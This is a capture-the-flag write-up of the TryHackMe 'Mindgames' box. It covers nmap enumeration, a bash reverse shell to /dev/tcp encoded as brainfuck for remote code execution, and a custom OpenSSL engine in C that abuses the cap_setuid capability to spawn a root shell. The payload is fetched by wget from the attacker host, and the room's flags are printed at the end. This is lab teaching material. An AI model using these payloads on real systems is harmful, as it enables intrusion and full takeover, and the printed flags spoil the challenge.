---
title: TryHackMe - Mindgames
description: My writeup on Mindgames box.
categories:
 - tryhackme
tags: tryhackme brainfuck python openssl capabilities gcc c
---

![](https://i.imgur.com/4zF0COC.png)

## Box Stats

| Box Info      | Details       |
| ------------- |:-------------:|
| Box Name :    | **Mindgames**  |
| Difficulty :  | **Medium**             |
| Play :    | [Mindgames](https://tryhackme.com/room/mindgames){:target="_blank"}      |
| Recommended : | Yes :heavy_check_mark:      |

## Summary

Hello, this box was a good one, the privilege escalation part was kinda hard because it needed lot of researching. Let's start!

## Enumeration/Reconnaissance

Now as always let’s continue with a nmap scan.

```
$ ip=10.10.8.168
$ nmap -sC -sV -oN nmap/mindgames.thm $ip
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-21 23:14 EET
Nmap scan report for 10.10.8.168 (10.10.8.168)
Host is up (0.14s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
|_  256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Mindgames.
```

When we visit the website we can see some brainfuck code:

![](https://i.imgur.com/5PtDa8h.png)

In the end, there is a box that allows us to execute code so i entered the brainfuck "hello, world" code.

![](https://i.imgur.com/vn52pKc.png)

If we use a [brainfuck deobfuscator](https://www.splitbrain.org/_static/ook/){:target="_blank"} we can see that the brainfuck code it's python code!

![](https://i.imgur.com/3JMF0cT.png)

## Shell as mindgames

So what we'll do is to encode our python code to brainfuck. We will use the `os.system` function to execute our reverse shell.

```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/$your_tun0_ip/5555 0>&1'")
```

To brainfuck:

```
+++++ +++++ [->++ +++++ +++<] >++++ +.+++ +.+++ .-.++ +.++. <++++ +++++
[->-- ----- --<]> ---.< +++++ +++[- >++++ ++++< ]>+++ +++++ +++++ ++.++
++.<+ +++++ ++++[ ->--- ----- --<]> --.-- -.<++ +++++ +++[- >++++ +++++
+<]>+ .++++ .<+++ +++++ [->-- ----- -<]>- ----. <++++ ++++[ ->+++ +++++
<]>++ +++.+ +++++ .---- --.+. <+++[ ->--- <]>-- ----. +++++ +++.< +++++
+++[- >---- ----< ]>--- --.-- ----. <++++ ++++[ ->+++ +++++ <]>.- .<+++
+[->+ +++<] >++.< +++[- >---< ]>--. <++++ ++++[ ->--- ----- <]>-- -----
-.<++ +[->+ ++<]> ++++. <++++ +++[- >++++ +++<] >++++ +.<++ +++++ +[->-
----- --<]> ---.+ +++++ +.<++ +++++ [->++ +++++ <]>++ +++++ +++.- .<+++
+[->+ +++<] >++.< +++[- >---< ]>--. <++++ ++++[ ->--- ----- <]>-- -----
-.<++ +[->+ ++<]> ++++. <++++ +++[- >++++ +++<] >++++ +++++ ++.<+ +++++
++[-> ----- ---<] >---- ----- .<+++ ++[-> +++++ <]>++ +++.< ++++[ ->---
-<]>- ----- --.-- ----. <+++[ ->+++ <]>++ ++++. <++++ +++[- >++++ +++<]
>++++ .+.<+ +++[- >++++ <]>+. <++++ ++++[ ->--- ----- <]>-- ----- .<+++
+++++ [->++ +++++ +<]>+ ++++. <++++ [->-- --<]> -.<++ +[->+ ++<]> ++++.
<++++ ++++[ ->--- ----- <]>-. ++.-. --.<+ ++[-> +++<] >++.< +++[- >---<
]>--. ++++. +.+.- ----- .+++. -.+++ ++.-- ----. +++++ +.... <++++ [->--
--<]> ----- .<+++ +[->+ +++<] >.<++ +[->+ ++<]> +++++ .<+++ +[->- ---<]
>---- ----. <+++[ ->+++ <]>++ .<+++ [->-- -<]>- .---- -.+++ ++++. <
```

```
$ nc -lvp 5555
listening on [any] 5555 ...

mindgames@mindgames:~/webserver$ python3 -c 'import pty; pty.spawn("/bin/bash")'
mindgames@mindgames:~/webserver$ whoami;id
mindgames
uid=1001(mindgames) gid=1001(mindgames) groups=1001(mindgames)
```

## Shell as root

Enumerating the system, i found out that `openssl` has the `CAP_SETUID` capability. This means that allows us to change the UID.

```
mindgames@mindgames:~/webserver$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep
```

But isn't that simple, [GTFObins](https://gtfobins.github.io/gtfobins/openssl/){:target="_blank"} doesn't provide a full answer but it gives a big hint.

![](https://i.imgur.com/f7H5BTX.png)

We can build an engine that executes a SUID shell. An engine is a software used for performing cryptographic operations. This [blog](https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/){:target="_blank"} helped me a lot!

This will be our payload:

```c
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
  setgid(0); setuid(0);
  execl("/bin/sh", "sh", 0);
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

Let's compile as follows now to create a shared library.

```
$ gcc -fPIC -w -o root.o -c root.c
$ gcc -shared -o pwn.so -lcrypto root.o     
```

Let's transfer the file now and execute it.

```
mindgames@mindgames:/tmp$ wget -q 10.9.234.105/pwn.so                    
mindgames@mindgames:/tmp$ openssl engine -t -c `pwd`/pwn.so                                                                                                                      
# whoami;id                                                                                                                                                                      
root                                                                                                                                                                             
uid=0(root) gid=1001(mindgames) groups=1001(mindgames)     
```

Let's read the flags.

```
# cat /root/root.txt
thm{1974a617cc84c5b51411c283544ee254}
# cat /home/mindgames/user.txt
thm{411f7d38247ff441ce4e134b459b6268}
```

## Thank You

Thank you for taking the time to read my writeup. If you don't understand something from the writeup or want to ask me something feel free to contact me through discord(0xatom#8707) or send me a message through twitter [0xatom](https://twitter.com/0xatom){:target="_blank"}

Until next time keep pwning hard! :fire:
